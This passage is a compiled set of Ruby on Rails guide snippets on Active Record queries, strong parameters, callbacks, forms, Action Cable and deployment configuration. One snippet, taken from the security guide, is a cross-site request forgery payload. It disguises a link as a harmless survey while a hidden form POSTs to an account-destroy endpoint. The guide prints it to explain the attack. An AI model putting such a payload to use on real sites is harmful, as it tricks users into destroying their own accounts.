https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_146\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.left_outer_joins(:reviews).distinct.select(\"customers.*, COUNT(reviews.*) AS reviews_count\").group(\"customers.id\")\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DISTINCT customers.*, COUNT(reviews.*) AS reviews_count FROM customers\nLEFT OUTER JOIN reviews ON reviews.customer_id = customers.id GROUP BY customers.id\n```\n\n----------------------------------------\n\nTITLE: Rails Strong Parameters - ForbiddenAttributesError\nDESCRIPTION: Illustrates how `ActiveModel::ForbiddenAttributesError` is raised when using mass assignment without explicitly permitting attributes using strong parameters. This example shows an insecure `create` action that attempts mass assignment without parameter whitelisting.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass PeopleController < ActionController::Base\n  # This will raise an ActiveModel::ForbiddenAttributesError\n  # because it's using mass assignment without an explicit permit.\n  def create\n    Person.create(params[:person])\n  end\n\n  # This will work as we are using `person_params` helper method, which has the\n  # call to `expect` to allow mass assignment.\n  def update\n    person = Person.find(params[:id])\n    person.update!(person_params)\n    redirect_to person\n  end\n\n  private\n    # Using a private method to encapsulate the permitted parameters is a good\n    # pattern. You can use the same list for both create and update.\n    def person_params\n      params.expect(person: [:name, :age])\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing Malicious POST Request through Link in HTML\nDESCRIPTION: This code demonstrates a security vulnerability where an attacker can disguise a destructive POST request as a harmless link. It creates a hidden form that submits to an account destruction endpoint when clicked, while showing a misleading URL in the browser's status bar.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_13\n\nLANGUAGE: html\nCODE:\n```\n<a href=\"http://www.harmless.com/\" onclick=\"\n  var f = document.createElement('form');\n  f.style.display = 'none';\n  this.parentNode.appendChild(f);\n  f.method = 'POST';\n  f.action = 'http://www.example.com/account/destroy';\n  f.submit();\n  return false;\">To the harmless survey</a>\n```\n\n----------------------------------------\n\nTITLE: Demonstrating ActiveModel::Attributes Functionality\nDESCRIPTION: This snippet demonstrates the casting and default value functionalities provided by `ActiveModel::Attributes`. It showcases how string inputs are cast to dates and integers are cast to booleans based on the attribute definitions. It also demonstrates default value assignment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\n\nirb> person.name = \"Jane\"\nirb> person.name\n=> \"Jane\"\n\n# Casts the string to a date set by the attribute\nirb> person.date_of_birth = \"2020-01-01\"\nirb> person.date_of_birth\n=> Wed, 01 Jan 2020\nirb> person.date_of_birth.class\n=> Date\n\n# Uses the default value set by the attribute\nirb> person.active\n=> true\n\n# Casts the integer to a boolean set by the attribute\nirb> person.active = 0\nirb> person.active\n=> false\n```\n\n----------------------------------------\n\nTITLE: Dynamically Setting Rails Asset Host from Environment Variable (Ruby)\nDESCRIPTION: Configures Rails to derive the asset CDN host from the 'CDN_HOST' environment variable, enhancing flexibility across environments and supporting staging/production workflows. This code would be placed in 'config/environments/production.rb' and requires the 'CDN_HOST' variable to be set with the CDN hostname value. The Rails asset pipeline will use this value as the prefix for all generated asset paths.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.asset_host = ENV[\"CDN_HOST\"]\n```\n\n----------------------------------------\n\nTITLE: Params Hash for Nested Attributes in Rails\nDESCRIPTION: This Ruby hash demonstrates the structure of the `params` hash generated when submitting a nested form with `accepts_nested_attributes_for`. The `addresses_attributes` key contains a hash where keys are string representations of integers (0 and 1), and values are hashes representing the attributes for each associated address.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_80\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  \"person\" => {\n    \"name\" => \"John Doe\",\n    \"addresses_attributes\" => {\n      \"0\" => {\n        \"kind\" => \"Home\",\n        \"street\" => \"221b Baker Street\"\n      },\n      \"1\" => {\n        \"kind\" => \"Office\",\n        \"street\" => \"31 Spooner Street\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Radio Buttons Example - ERB\nDESCRIPTION: This snippet demonstrates how to create a group of radio buttons using the form builder in ERB. It generates three radio buttons for selecting an ice cream flavor: Chocolate Chip, Vanilla, and Hazelnut. Only one flavor can be selected at a time.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_7\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.radio_button :flavor, \"chocolate_chip\" %>\n<%= form.label :flavor_chocolate_chip, \"Chocolate Chip\" %>\n<%= form.radio_button :flavor, \"vanilla\" %>\n<%= form.label :flavor_vanilla, \"Vanilla\" %>\n<%= form.radio_button :flavor, \"hazelnut\" %>\n<%= form.label :flavor_hazelnut, \"Hazelnut\" %>\n```\n\n----------------------------------------\n\nTITLE: Integrating DirectUpload with Custom Authentication\nDESCRIPTION: This example shows how to integrate DirectUpload with custom authentication using headers. It includes a JavaScript class for handling uploads and a Ruby controller for authentication.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_74\n\nLANGUAGE: javascript\nCODE:\n```\nimport { DirectUpload } from \"@rails/activestorage\"\n\nclass Uploader {\n  constructor(file, url, token) {\n    const headers = { 'Authentication': `Bearer ${token}` }\n    // INFO: Sending headers is an optional parameter. If you choose not to send headers,\n    //       authentication will be performed using cookies or session data.\n    this.upload = new DirectUpload(file, url, this, headers)\n  }\n\n  uploadFile(file) {\n    this.upload.create((error, blob) => {\n      if (error) {\n        // Handle the error\n      } else {\n        // Use the with blob.signed_id as a file reference in next request\n      }\n    })\n  }\n\n  directUploadWillStoreFileWithXHR(request) {\n    request.upload.addEventListener(\"progress\",\n      event => this.directUploadDidProgress(event))\n  }\n\n  directUploadDidProgress(event) {\n    // Use event.loaded and event.total to update the progress bar\n  }\n}\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass DirectUploadsController < ActiveStorage::DirectUploadsController\n  skip_forgery_protection\n  before_action :authenticate!\n\n  def authenticate!\n    @token = request.headers[\"Authorization\"]&.split&.last\n\n    head :unauthorized unless valid_token?(@token)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: EXPLAIN Output Example for PostgreSQL with Includes\nDESCRIPTION: This is the output of running `explain` with `includes` on PostgreSQL. Similar to the MySQL/MariaDB output, it shows two queries are generated. In addition to the explain plan it also shows the SQL executed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_214\n\nLANGUAGE: sql\nCODE:\n```\n  Customer Load (0.3ms)  SELECT \"customers\".* FROM \"customers\" WHERE \"customers\".\"id\" = $1  [[\"id\", 1]]\n  Order Load (0.3ms)  SELECT \"orders\".* FROM \"orders\" WHERE \"orders\".\"customer_id\" = $1  [[\"customer_id\", 1]]\n=> EXPLAIN SELECT \"customers\".* FROM \"customers\" WHERE \"customers\".\"id\" = $1 [[\"id\", 1]]\n                                    QUERY PLAN\n----------------------------------------------------------------------------------\n Index Scan using customers_pkey on customers  (cost=0.15..8.17 rows=1 width=164)\n   Index Cond: (id = '1'::bigint)\n(2 rows)\n```\n\n----------------------------------------\n\nTITLE: Debugging CDN Headers with curl in Bash\nDESCRIPTION: Example of using curl to check headers from both a server and CDN to verify proper caching configuration. This helps ensure CDN assets are being cached correctly by comparing the Cache-Control and other headers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_19\n\nLANGUAGE: bash\nCODE:\n```\n$ curl -I http://www.example/assets/application-d0e099e021c95eb0de3615fd1d8c4d83.css\nHTTP/1.1 200 OK\nServer: Cowboy\nDate: Sun, 24 Aug 2014 20:27:50 GMT\nConnection: keep-alive\nLast-Modified: Thu, 08 May 2014 01:24:14 GMT\nContent-Type: text/css\nCache-Control: public, max-age=2592000\nContent-Length: 126560\nVia: 1.1 vegur\n```\n\n----------------------------------------\n\nTITLE: Destroy Callbacks in Rails ActiveRecord\nDESCRIPTION: Demonstrates the use of before_destroy, around_destroy, and after_destroy callbacks in a Rails ActiveRecord model. These callbacks are triggered when a record is destroyed in the database, allowing for custom logic to be executed at different stages of the destruction process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  before_destroy :check_admin_count\n  around_destroy :log_destroy_operation\n  after_destroy :notify_users\n\n  private\n    def check_admin_count\n      if admin? && User.where(role: \"admin\").count == 1\n        throw :abort\n      end\n      Rails.logger.info(\"Checked the admin count\")\n    end\n\n    def log_destroy_operation\n      Rails.logger.info(\"About to destroy user with ID #{id}\")\n      yield\n      Rails.logger.info(\"User with ID #{id} destroyed successfully\")\n    end\n\n    def notify_users\n      UserMailer.deletion_email(self).deliver_later\n      Rails.logger.info(\"Notification sent to other users about user deletion\")\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Appearance Channel (Server)\nDESCRIPTION: This Ruby code defines the server-side logic for an Action Cable channel named `AppearanceChannel`. It handles subscription, unsubscription, appearing, and going away events, linking them to corresponding methods on the `current_user` object. The `current_user` object represents the user associated with the WebSocket connection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_21\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/appearance_channel.rb\nclass AppearanceChannel < ApplicationCable::Channel\n  def subscribed\n    current_user.appear\n  end\n\n  def unsubscribed\n    current_user.disappear\n  end\n\n  def appear(data)\n    current_user.appear(on: data[\"appearing_on\"])\n  end\n\n  def away\n    current_user.away\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Compact Partial-Local Default Variable Assignments in Rails\nDESCRIPTION: This example demonstrates how to combine Ruby 3.1's pattern matching assignment with calls to `Hash#with_defaults` to enable compact partial-local default variable assignments. It provides default values for `product` and `related_products` if they are not already present in `local_assigns`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_28\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/products/_product.html.erb %>\n\n<% local_assigns.with_defaults(related_products: []) => { product:, related_products: } %>\n\n<%= tag.div id: dom_id(product) do %>\n  <h1><%= product.name %></h1>\n\n  <% related_products.each do |related_product| %>\n    <%# ... %>\n  <% end %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Testing Email Enqueueing with Named Arguments (Ruby)\nDESCRIPTION: This test asserts that an email has been enqueued with the correct named arguments, passed as a hash within the `args` option of `assert_enqueued_email_with`. It uses `UserMailer.create_invite` with named arguments and validates the enqueued mailer with corresponding named arguments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_97\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass UserMailerTest < ActionMailer::TestCase\n  test \"invite\" do\n    # Create the email and store it for further assertions\n    email = UserMailer.create_invite(from: \"me@example.com\", to: \"friend@example.com\")\n\n    # Test that the email got enqueued with the correct named arguments\n    assert_enqueued_email_with UserMailer, :create_invite,\n    args: [{ from: \"me@example.com\", to: \"friend@example.com\" }] do\n      email.deliver_later\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: HTML Output of a Rails UJS-Enabled Form - HTML\nDESCRIPTION: Displays the generated HTML markup for a form created using Rails 3's :remote => true option. The form includes the 'data-remote' attribute, which UJS drivers use to intercept submission. Inputs are the Rails template helpers; output is this HTML string. The snippet is illustrative—actual generated IDs and URLs depend on the context.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n<form action=\\\"http://host.com\\\" id=\\\"create-post\\\" method=\\\"post\\\" data-remote=\\\"true\\\">\n```\n\n----------------------------------------\n\nTITLE: Running Spring Commands with Rails CLI\nDESCRIPTION: Examples of using Spring preloader through Rails CLI commands for running tests and accessing console.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rake test:models\n$ bin/rails console\n$ bin/spring status\nSpring is running:\n\n 1182 spring server | my_app | started 29 mins ago\n 3656 spring app    | my_app | started 23 secs ago | test mode\n 3746 spring app    | my_app | started 10 secs ago | development mode\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Cable Adapters (YAML)\nDESCRIPTION: This YAML code configures Action Cable's subscription adapter for different Rails environments (development, test, production). It specifies the adapter to use (e.g., async, test, redis) and any adapter-specific settings, such as the Redis URL and channel prefix. The redis adapter can also be configured with SSL/TLS parameters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_26\n\nLANGUAGE: YAML\nCODE:\n```\ndevelopment:\n  adapter: async\n\ntest:\n  adapter: test\n\nproduction:\n  adapter: redis\n  url: redis://10.10.3.153:6381\n  channel_prefix: appname_production\n```\n\n----------------------------------------\n\nTITLE: Simplified HTTP Authentication in Rails Controller\nDESCRIPTION: Demonstrates the new simplified way of implementing HTTP basic authentication using the http_basic_authenticate_with class method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass PostsController < ApplicationController\n  http_basic_authenticate_with :name => \"dhh\", :password => \"secret\", :except => :index\n\n  def index\n    render :text => \"Everyone can see me!\"\n  end\n\n  def edit\n    render :text => \"I'm only accessible if you know the password\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Batch Processing Records with find_in_batches in Ruby on Rails\nDESCRIPTION: Demonstrates how to process large numbers of records efficiently using find_in_batches method. This approach reduces memory pressure by processing records in batches of 1000 by default.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_in_batches(:conditions => {:active => true}) do |customer_group|\n  customer_group.each { |customer| customer.update_account_balance! }\nend\n```\n\n----------------------------------------\n\nTITLE: Querying Collection IDs in Rails\nDESCRIPTION: Demonstrates how to retrieve an array of ids from an associated collection using collection_singular_ids method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\n@book_ids = @author.book_ids\n```\n\n----------------------------------------\n\nTITLE: Enabling Encryption for Solid Cache in cache.yml\nDESCRIPTION: This snippet demonstrates enabling encryption for Solid Cache by setting the `encrypt` value to `true` in the `config/cache.yml` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_30\n\nLANGUAGE: yaml\nCODE:\n```\n# config/cache.yml\nproduction:\n  encrypt: true\n```\n\n----------------------------------------\n\nTITLE: Enabling Thread Safety in Rails Production\nDESCRIPTION: Configuration setting to enable multithreaded dispatching in Rails production environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.threadsafe!\n```\n\n----------------------------------------\n\nTITLE: Generating Rails guides in a translated language\nDESCRIPTION: Commands to install guide dependencies and generate Rails guides in a specific language (Italian in this example).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ BUNDLE_ONLY=default:doc bundle install\n$ cd guides/\n$ BUNDLE_ONLY=default:doc bundle exec rake guides:generate:html GUIDES_LANGUAGE=it-IT\n```\n\n----------------------------------------\n\nTITLE: Validating Generated HTML - Bash\nDESCRIPTION: Shows the command to run HTML validation on generated Rails guides, helping authors avoid duplicate IDs and other issues. Requires the Rails guides generation environment and Bundler.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake guides:validate\n```\n\n----------------------------------------\n\nTITLE: Running Tests Serially with a Specific Seed in Bash (Action View)\nDESCRIPTION: Executes a specific test file (`test/template/test_case_test.rb`) in Action View using a specific seed (53708) and forces tests to run serially by setting `PARALLEL_WORKERS=1`. This is useful for debugging intermittent failures that might be caused by parallel execution race conditions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_21\n\nLANGUAGE: bash\nCODE:\n```\n$ cd actionview\n$ PARALLEL_WORKERS=1 SEED=53708 bin/test test/template/test_case_test.rb\n```\n\n----------------------------------------\n\nTITLE: Generating a Job on a specific queue\nDESCRIPTION: This command generates a new job and specifies that it should be run on the 'urgent' queue. This allows for prioritizing certain jobs over others.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate job guests_cleanup --queue urgent\n```\n\n----------------------------------------\n\nTITLE: Example Asset Manifest JSON Structure\nDESCRIPTION: Sample structure of a .manifest.json file showing how asset filenames are mapped to their fingerprinted versions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"application.css\": \"application-6d58c9e6e3b5d4a7c9a8e3.css\",\n  \"application.js\": \"application-2d4b9f6c5a7c8e2b8d9e6.js\",\n  \"logo.png\": \"logo-f3e8c9b2a6e5d4c8.png\",\n  \"favicon.ico\": \"favicon-d6c8e5a9f3b2c7.ico\"\n}\n```\n\n----------------------------------------\n\nTITLE: Including the Notifications Concern in the Product Model - Ruby\nDESCRIPTION: This snippet demonstrates how to include the `Notifications` concern in the `Product` model. By including the concern, the `Product` model gains access to the methods and associations defined within the `Notifications` module, simplifying the model's code and improving organization. Other attributes and validations for the Product model are defined as well.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_113\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\n  include Notifications\n\n  has_one_attached :featured_image\n  has_rich_text :description\n\n  validates :name, presence: true\n  validates :inventory_count, numericality: { greater_than_or_equal_to: 0 }\nend\n```\n\n----------------------------------------\n\nTITLE: Disable Parameter Wrapping in Rails\nDESCRIPTION: Shows how to disable the default parameter wrapping feature in Rails using the configuration setting.  Setting `wrap_parameters_by_default` to `false` prevents Rails from automatically wrapping JSON parameters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_controller.wrap_parameters_by_default = false\n```\n\n----------------------------------------\n\nTITLE: Configuring Kamal Deployment\nDESCRIPTION: This YAML snippet shows the configuration for deploying a Rails application using Kamal. It specifies the service name, container image, server details, registry credentials, and SSL settings.  The server IP address and Docker Hub username needs to be customized.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_131\n\nLANGUAGE: yaml\nCODE:\n```\n# Name of your application. Used to uniquely configure containers.\nservice: store\n\n# Name of the container image.\nimage: your-user/store\n\n# Deploy to these servers.\nservers:\n  web:\n    - 192.168.0.1\n\n# Credentials for your image host.\nregistry:\n  # Specify the registry server, if you're not using Docker Hub\n  # server: registry.digitalocean.com / ghcr.io / ...\n  username: your-user\n```\n\nLANGUAGE: yaml\nCODE:\n```\nproxy:\n  ssl: true\n  host: app.example.com\n```\n\n----------------------------------------\n\nTITLE: Creating Subscribers Controller (Rails)\nDESCRIPTION: This code defines a SubscribersController with a `create` action that allows unauthenticated access. It finds the product using the `product_id` parameter and creates a new subscriber associated with that product. The controller redirects back to the product page with a notice.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_101\n\nLANGUAGE: ruby\nCODE:\n```\nclass SubscribersController < ApplicationController\n  allow_unauthenticated_access\n  before_action :set_product\n\n  def create\n    @product.subscribers.where(subscriber_params).first_or_create\n    redirect_to @product, notice: \"You are now subscribed.\"\n  end\n\n  private\n\n  def set_product\n    @product = Product.find(params[:product_id])\n  end\n\n  def subscriber_params\n    params.expect(subscriber: [ :email ])\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring ActiveRecord Database Selector Middleware - Ruby\nDESCRIPTION: This Ruby code configures Rails to use the database selector middleware, enabling automatic connection switching based on request context and a configurable delay. Dependencies include Rails 6+ and multiple database configurations. The code should be added to a Rails initializer or environment config file and requires the ActiveRecord::Middleware classes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.configure do\n  config.active_record.database_selector = { delay: 2.seconds }\n  config.active_record.database_resolver = ActiveRecord::Middleware::DatabaseSelector::Resolver\n  config.active_record.database_resolver_context = ActiveRecord::Middleware::DatabaseSelector::Resolver::Session\nend\n```\n\n----------------------------------------\n\nTITLE: Using 'as' Option to Rename Local Variable in Rails\nDESCRIPTION: This example demonstrates how to use the `as` option to specify a different name for the local variable within a partial. It changes the default local variable name `product` to `item` when rendering the `_product.html.erb` partial with the `@item` object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_20\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"product\", object: @item, as: \"item\" %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"product\", locals: { item: @item } %>\n```\n\n----------------------------------------\n\nTITLE: Testing Jobs in Context (Ruby)\nDESCRIPTION: This test shows how to test that a job is correctly enqueued within the context of a model method. It uses `assert_enqueued_with` to check that `BillingJob` is enqueued when `account.charge_for(product)` is called. It also demonstrates how to use `perform_enqueued_jobs` to execute the job and assert the final state.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_103\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass AccountTest < ActiveSupport::TestCase\n  include ActiveJob::TestHelper\n\n  test \"#charge_for enqueues billing job\" do\n    assert_enqueued_with(job: BillingJob) do\n      account.charge_for(product)\n    end\n\n    assert_not account.reload.charged_for?(product)\n\n    perform_enqueued_jobs\n\n    assert account.reload.charged_for?(product)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Create Callbacks in Rails ActiveRecord\nDESCRIPTION: Demonstrates the use of before_create, around_create, and after_create callbacks in a Rails ActiveRecord model. These callbacks are triggered when a new record is created in the database, allowing for custom logic to be executed at different stages of the creation process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  before_create :set_default_role\n  around_create :log_creation\n  after_create :send_welcome_email\n\n  private\n    def set_default_role\n      self.role = \"user\"\n      Rails.logger.info(\"User role set to default: user\")\n    end\n\n    def log_creation\n      Rails.logger.info(\"Creating user with email: #{email}\")\n      yield\n      Rails.logger.info(\"User created with email: #{email}\")\n    end\n\n    def send_welcome_email\n      UserMailer.welcome_email(self).deliver_later\n      Rails.logger.info(\"User welcome email sent to: #{email}\")\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Scaffold for Sharded Database - Rails CLI - Bash\nDESCRIPTION: This shell command creates a scaffold for the Dog model specifically in the 'primary_shard_one' shard database, leveraging the --database flag. Rails requires preconfigured sharding and the related database config in place. The generator will create migration and model files under the correct paths for shard-specific code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_21\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails g scaffold Dog name:string --database primary_shard_one\n```\n\n----------------------------------------\n\nTITLE: Generating Scaffold with a Custom Abstract Parent - Rails CLI - Bash\nDESCRIPTION: This command runs the Rails scaffold generator for a Dog model targeting the 'animals' database, specifying '--parent Animals::Record' to use a custom parent class rather than generating AnimalsRecord. This helps maintain custom class hierarchies for multi-database support. Dependencies are Rails and the existence of the specified parent class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold Dog name:string --database animals --parent Animals::Record\n```\n\n----------------------------------------\n\nTITLE: Creating a Rails Template with Devise Installation Options\nDESCRIPTION: A Ruby template file that prompts the user to install Devise, sets up the user model, and performs initial Git commit. This template can be used when generating a new Rails application to automate common setup tasks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nif yes?(\"Would you like to install Devise?\")\n  gem \"devise\"\n  devise_model = ask(\"What would you like the user model to be called?\", default: \"User\")\nend\n\nafter_bundle do\n  if devise_model\n    generate \"devise:install\"\n    generate \"devise\", devise_model\n    rails_command \"db:migrate\"\n  end\n\n  git add: \".\", commit: %(-m 'Initial commit')\nend\n```\n\n----------------------------------------\n\nTITLE: Schema Definition after Migration (Ruby)\nDESCRIPTION: This schema.rb file represents the database structure after the 'create_products' migration has been run. It defines the 'products' table with specified columns and their data types, as well as enabling the 'plpgsql' extension.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n# db/schema.rb\nActiveRecord::Schema[8.1].define(version: 2024_05_02_100843) do\n  # These are extensions that must be enabled in order to support this database\n  enable_extension \"plpgsql\"\n\n  create_table \"products\", force: :cascade do |t|\n    t.string \"name\"\n    t.text \"description\"\n    t.datetime \"created_at\", null: false\n    t.datetime \"updated_at\", null: false\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Advancing Dates using advance in Ruby\nDESCRIPTION: The `advance` method allows advancing a date by specified increments of years, months, weeks, and days. It accepts a hash as an argument, with keys `:years`, `:months`, `:weeks`, and `:days`, and their corresponding integer values. Increments can be positive or negative.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_152\n\nLANGUAGE: ruby\nCODE:\n```\ndate = Date.new(2010, 6, 6)\ndate.advance(years: 1, weeks: 2)  # => Mon, 20 Jun 2011\ndate.advance(months: 2, days: -2) # => Wed, 04 Aug 2010\n```\n\n----------------------------------------\n\nTITLE: Defining Health Check Endpoint in Rails Routes (Ruby)\nDESCRIPTION: This code defines a custom health check route in a Rails application's routing file, mapping GET requests to the \"/health\" path to the \"rails/health#show\" controller action and naming the route as :rails_health_check. This enables external systems to check application uptime by querying the endpoint. Should be placed in the application's config/routes.rb file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.routes.draw do\n  get \"health\" => \"rails/health#show\", as: :rails_health_check\nend\n\n```\n\n----------------------------------------\n\nTITLE: Date calculations with monday and sunday in Ruby\nDESCRIPTION: These methods return the dates for the previous Monday and next Sunday, respectively. It demonstrates how to use `monday` and `sunday` methods on a Date object to get the date of the previous Monday or the next Sunday.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_142\n\nLANGUAGE: ruby\nCODE:\n```\nd = Date.new(2010, 5, 8)     # => Sat, 08 May 2010\nd.monday                     # => Mon, 03 May 2010\nd.sunday                     # => Sun, 09 May 2010\n\nd = Date.new(2012, 9, 10)    # => Mon, 10 Sep 2012\nd.monday                     # => Mon, 10 Sep 2012\n\nd = Date.new(2012, 9, 16)    # => Sun, 16 Sep 2012\nd.sunday                     # => Sun, 16 Sep 2012\n```\n\n----------------------------------------\n\nTITLE: Precompiling Assets with Randomized Secret Key (Rails, Bash)\nDESCRIPTION: Runs the assets precompilation command in production with 'SECRET_KEY_BASE_DUMMY' set, causing Rails to generate a temporary secret_key_base file for the build process. Useful in CI/CD pipelines where production secrets are unavailable. Requires a Rails environment and will build digested assets under public/assets as output.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\n$ RAILS_ENV=production SECRET_KEY_BASE_DUMMY=1 rails assets:precompile\n```\n\n----------------------------------------\n\nTITLE: ActiveRecord Model Definition with Enum and Scope\nDESCRIPTION: Defines the Order model with a belongs_to association to Customer, and a has_and_belongs_to_many association to Book models. It includes an enum for order status and a scope for finding orders created before a given time. This illustrates the use of enums and parameterized scopes in ActiveRecord.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass Order < ApplicationRecord\n  belongs_to :customer\n  has_and_belongs_to_many :books, join_table: \"books_orders\"\n\n  enum :status, [:shipped, :being_packed, :complete, :cancelled]\n\n  scope :created_before, ->(time) { where(created_at: ...time) }\nend\n```\n\n----------------------------------------\n\nTITLE: HTML Output for Composite Key Form\nDESCRIPTION: This snippet shows the HTML output generated by the form_with helper when bound to a model with a composite primary key. Note the URL contains the author_id and id delimited by an underscore.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_20\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/books/2_25\" method=\"post\" accept-charset=\"UTF-8\" >\n  <input name=\"authenticity_token\" type=\"hidden\" value=\"ChwHeyegcpAFDdBvXvDuvbfW7yCA3e8gvhyieai7DhG28C3akh-dyuv-IBittsjPrIjETlQQvQJ91T77QQ8xWA\" />\n  <input type=\"text\" name=\"book[title]\" id=\"book_title\" value=\"Some book\" />\n  <input type=\"submit\" name=\"commit\" value=\"Update Book\" data-disable-with=\"Update Book\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: Validating Presence of Boolean 